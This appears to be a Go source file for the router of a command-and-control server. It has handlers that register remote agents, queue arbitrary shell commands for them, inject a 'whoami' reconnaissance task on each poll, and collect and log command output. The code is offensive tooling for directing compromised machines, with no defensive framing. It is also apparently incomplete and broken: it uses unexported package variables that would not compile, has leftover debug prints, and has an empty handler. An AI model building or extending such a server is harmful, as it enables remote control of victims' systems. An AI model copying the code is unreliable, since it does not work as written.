package routers

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"

	"gobricked/util"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
)

func registerAgentHandler(w http.ResponseWriter, r *http.Request) {
	var agent util.Agent
	if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	util.mutex.Lock()
	defer util.mutex.Unlock()

	agentID := uuid.New().String()
	agent.ID = agentID
	agent.LastSeen = time.Now()
	util.agents[agentID] = agent

	log.Printf("[+] Registered agent %s (%s)", agentID, agent.Hostname)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agent)
}

func getTasksHandler(w http.ResponseWriter, r *http.Request) {
	agentID := mux.Vars(r)["agentID"]

	util.mutex.Lock()
	defer util.mutex.Unlock()

	agentTasks := util.tasks[agentID]
	exampleTask := util.Task{
		ID:      "task-01",
		Command: "whoami",
	}
	agentTasks = append(agentTasks, exampleTask)
	util.tasks[agentID] = []util.Task{}

	log.Printf("[>] Agent %s pulled %d task(s)", agentID, len(agentTasks))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agentTasks)
}

func postTaskHandler(w http.ResponseWriter, r *http.Request) {
	var task struct {
		AgentID string `json:"agent_id"`
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
		http.Error(w, "Invalid task", http.StatusBadRequest)
		return
	}

	util.mutex.Lock()
	defer util.mutex.Unlock()

	newTask := util.Task{
		ID:      uuid.New().String(),
		Command: task.Command,
	}
	util.tasks[task.AgentID] = append(util.tasks[task.AgentID], newTask)

	log.Printf("[*] Added task %s to agent %s", newTask.ID, task.AgentID)
	w.WriteHeader(http.StatusCreated)
}

func postResultHandler(w http.ResponseWriter, r *http.Request) {
	var result util.Result
	fmt.Println("HERE")
	err := json.NewDecoder(r.Body).Decode(&result)
	fmt.Println("RESULT: ", result)

	if err != nil {
		http.Error(w, "Invalid result", http.StatusBadRequest)
		return
	}

	util.mutex.Lock()
	defer util.mutex.Unlock()

	util.results = append(util.results, result)
	log.Printf("[✓] Received result for task (%s) from agent (%s) > %s", result.TaskID, result.AgentID, result.Output)
	w.WriteHeader(http.StatusCreated)
}

func getResultHandler(w http.ResponseWriter, r *http.Request) {

}
